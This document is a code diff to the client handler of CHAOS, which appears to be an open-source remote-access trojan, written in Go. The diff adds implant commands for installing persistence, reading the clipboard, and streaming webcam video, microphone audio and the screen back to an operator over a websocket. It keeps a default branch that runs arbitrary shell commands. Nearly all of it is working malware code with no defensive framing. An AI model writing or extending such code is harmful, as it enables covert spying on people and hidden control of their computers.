@@ -1,6 +1,7 @@
 package handler
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"github.com/gorilla/websocket"
@@ -11,16 +12,19 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
 	"net/http"
+	"strconv"
+	"sync"
 	"time"
 )
 
 type Handler struct {
-	Connection    *websocket.Conn
-	Configuration *environment.Configuration
-	Gateway       gateways.Gateway
-	Services      *services.Services
-	ClientID      string
-	Connected     bool
+	Connection       *websocket.Conn
+	Configuration    *environment.Configuration
+	Gateway          gateways.Gateway
+	Services         *services.Services
+	ClientID         string
+	Connected        bool
+	StreamingCancels map[string]context.CancelFunc
 }
 
 func NewHandler(
@@ -30,10 +34,11 @@ func NewHandler(
 	clientID string,
 ) *Handler {
 	return &Handler{
-		Configuration: configuration,
-		Gateway:       gateway,
-		Services:      services,
-		ClientID:      clientID,
+		Configuration:    configuration,
+		Gateway:          gateway,
+		Services:         services,
+		ClientID:         clientID,
+		StreamingCancels: make(map[string]context.CancelFunc),
 	}
 }
 
@@ -151,7 +156,7 @@ func (h *Handler) HandleCommand() {
 			response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
 			break
 		case "screenshot":
-			screenshot, err := h.Services.Screenshot.TakeScreenshot()
+			screenshot, err := h.Services.Screenshot.TakeScreenshot(100)
 			if err != nil {
 				hasError = true
 				response = encode.StringToByte(err.Error())
@@ -182,6 +187,169 @@ func (h *Handler) HandleCommand() {
 				hasError = true
 				response = encode.StringToByte(err.Error())
 			}
+			break
+		case "persistence":
+			if err := h.Services.OS.InstallPersistence(); err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			}
+			break
+		case "clipboard":
+			clipboard, err := h.Services.OS.GetClipboard()
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+			} else {
+				response = encode.StringToByte(clipboard)
+			}
+			break
+		case "webcam":
+			quality := 80
+			if request.Parameter != "" {
+				if q, err := strconv.Atoi(request.Parameter); err == nil {
+					quality = q
+				}
+			}
+			h.Log("[+] Starting webcam streaming with quality:", quality)
+			ctx, cancel := context.WithCancel(context.Background())
+			h.StreamingCancels["webcam"] = cancel
+			go func() {
+				ticker := time.NewTicker(100 * time.Millisecond)
+				defer ticker.Stop()
+				streamCount := 0
+				for {
+					select {
+					case <-ctx.Done():
+						h.Log("[+] Webcam streaming stopped")
+						return
+					case <-ticker.C:
+						image, err := h.Services.Webcam.CaptureWebcam(quality)
+						if err != nil {
+							h.Log("[-] Webcam capture error:", err.Error())
+							continue
+						}
+						body, err := json.Marshal(entities.Command{
+							ClientID: h.ClientID,
+							Response: image,
+							HasError: false,
+						})
+						if err != nil {
+							h.Log("[-] JSON marshal error:", err.Error())
+							continue
+						}
+						err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
+						if err != nil {
+							h.Log("[-] WebSocket send error:", err.Error())
+							return
+						}
+						streamCount++
+						if streamCount%10 == 0 { // Log every 10 frames
+							h.Log("[+] Webcam streamed", streamCount, "frames")
+						}
+					}
+				}
+			}()
+			response = []byte("Webcam streaming started")
+			break
+		case "microphone":
+			quality := 80
+			if request.Parameter != "" {
+				if q, err := strconv.Atoi(request.Parameter); err == nil {
+					quality = q
+				}
+			}
+			h.Log("[+] Starting microphone streaming with quality:", quality)
+			ctx, cancel := context.WithCancel(context.Background())
+			h.StreamingCancels["microphone"] = cancel
+			go func() {
+				ticker := time.NewTicker(1 * time.Second)
+				defer ticker.Stop()
+				streamCount := 0
+				for {
+					select {
+					case <-ctx.Done():
+						h.Log("[+] Microphone streaming stopped")
+						return
+					case <-ticker.C:
+						audio, err := h.Services.Microphone.CaptureAudio(1, quality)
+						if err != nil {
+							h.Log("[-] Microphone capture error:", err.Error())
+							continue
+						}
+						body, err := json.Marshal(entities.Command{
+							ClientID: h.ClientID,
+							Response: audio,
+							HasError: false,
+						})
+						if err != nil {
+							h.Log("[-] JSON marshal error:", err.Error())
+							continue
+						}
+						err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
+						if err != nil {
+							h.Log("[-] WebSocket send error:", err.Error())
+							return
+						}
+						// Store for web access
+						setStreamData(h.ClientID+"_microphone", audio)
+						streamCount++
+						if streamCount%5 == 0 { // Log every 5 seconds
+							h.Log("[+] Microphone streamed", streamCount, "chunks")
+						}
+					}
+				}
+			}()
+			response = []byte("Microphone streaming started")
+			break
+		case "screenstream":
+			quality := 80
+			if request.Parameter != "" {
+				if q, err := strconv.Atoi(request.Parameter); err == nil {
+					quality = q
+				}
+			}
+			h.Log("[+] Starting screen streaming with quality:", quality)
+			ctx, cancel := context.WithCancel(context.Background())
+			h.StreamingCancels["screenstream"] = cancel
+			go func() {
+				ticker := time.NewTicker(100 * time.Millisecond)
+				defer ticker.Stop()
+				streamCount := 0
+				for {
+					select {
+					case <-ctx.Done():
+						h.Log("[+] Screen streaming stopped")
+						return
+					case <-ticker.C:
+						screenshot, err := h.Services.Screenshot.TakeScreenshot(quality)
+						if err != nil {
+							h.Log("[-] Screenshot capture error:", err.Error())
+							continue
+						}
+						body, err := json.Marshal(entities.Command{
+							ClientID: h.ClientID,
+							Response: screenshot,
+							HasError: false,
+						})
+						if err != nil {
+							h.Log("[-] JSON marshal error:", err.Error())
+							continue
+						}
+						err = h.Connection.WriteMessage(websocket.BinaryMessage, body)
+						if err != nil {
+							h.Log("[-] WebSocket send error:", err.Error())
+							return
+						}
+						// Store for web access
+						setStreamData(h.ClientID+"_screenstream", screenshot)
+						streamCount++
+						if streamCount%10 == 0 { // Log every 10 frames
+							h.Log("[+] Screen streamed", streamCount, "frames")
+						}
+					}
+				}
+			}()
+			response = []byte("Screen streaming started")
 			break
 		case "explore":
 			fileExplorer, err := h.Services.Explorer.ExploreDirectory(request.Parameter)
@@ -230,6 +398,16 @@ func (h *Handler) HandleCommand() {
 				break
 			}
 			break
+		case "stop":
+			streamType := request.Parameter
+			if cancel, ok := h.StreamingCancels[streamType]; ok {
+				cancel()
+				delete(h.StreamingCancels, streamType)
+				response = []byte(streamType + " streaming stopped")
+			} else {
+				response = []byte("No active stream for " + streamType)
+			}
+			break
 		default:
 			response, err = h.RunCommand(request.Command)
 			if err != nil {
@@ -256,4 +434,27 @@ func (h *Handler) HandleCommand() {
 
 func (h *Handler) RunCommand(command string) ([]byte, error) {
 	return h.Services.Terminal.Run(command)
+}
+
+// Embedded stream functions
+var streamData = make(map[string][]byte)
+var streamMutex sync.Mutex
+
+func setStreamData(key string, data []byte) {
+	streamMutex.Lock()
+	defer streamMutex.Unlock()
+	streamData[key] = make([]byte, len(data))
+	copy(streamData[key], data)
+}
+
+func getStreamData(key string) ([]byte, bool) {
+	streamMutex.Lock()
+	defer streamMutex.Unlock()
+	data, ok := streamData[key]
+	if !ok {
+		return nil, false
+	}
+	result := make([]byte, len(data))
+	copy(result, data)
+	return result, true
 }
